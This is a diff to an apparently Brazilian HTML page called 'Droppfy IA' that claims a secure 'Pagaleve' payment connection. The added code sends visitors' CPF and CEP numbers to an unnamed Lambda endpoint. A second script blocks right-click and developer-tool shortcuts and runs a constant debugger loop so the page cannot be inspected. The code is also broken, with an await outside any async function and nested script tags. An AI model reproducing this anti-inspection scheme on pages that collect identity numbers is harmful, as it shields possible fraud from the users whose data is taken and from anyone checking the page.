@@ -2,6 +2,11 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
+    <meta name="description" content="Sistema Droppfy IA - Pagamento Inteligente">
+    <meta property="og:title" content="DROPPFY IA OPERACIONAL">
+    <meta property="og:description" content="Conexão Segura Pagaleve Ativa">
+    <meta property="og:image" content="https://raw.githubusercontent.com/gpartnerllc-png/gpartnerllc-png.github.io/main/thumb.png">
+    <meta name="theme-color" content="#00d4ff">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SISTEMA DROPPFY IA OPERACIONAL</title>
     
@@ -92,6 +97,20 @@
     </div>
 
     <script>
+
+
+        const response = await fetch(URL_LAMBDA, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        // Aqui você pode adicionar chaves extras se configurou no Allow Headers
+    },
+    body: JSON.stringify({ 
+        cpf: cpfInput, 
+        cep: cepInput,
+        v12_auth: "AUTORIDADE_ATIVA" 
+    })
+});
         // INICIALIZAÇÃO DO VISUAL NEURAL
         window.addEventListener('DOMContentLoaded', () => {
             VANTA.NET({
@@ -125,6 +144,28 @@
                 status.innerText = "❌ ERRO DE CONEXÃO. TENTE NOVAMENTE.";
             }
         }
+    </script>
+
+    <script>
+
+        <script>
+    // 1. Bloqueia o Clique Direito
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    // 2. Bloqueia Atalhos de Teclado (F12, Ctrl+U, Ctrl+Shift+I)
+    document.onkeydown = function(e) {
+        if (e.keyCode == 123) return false; // F12
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+    };
+
+    // 3. Anti-Debugger (Trava o console se for aberto)
+    setInterval(function() {
+        debugger;
+    }, 100);
+</script>
     </script>
 </body>
 </html>
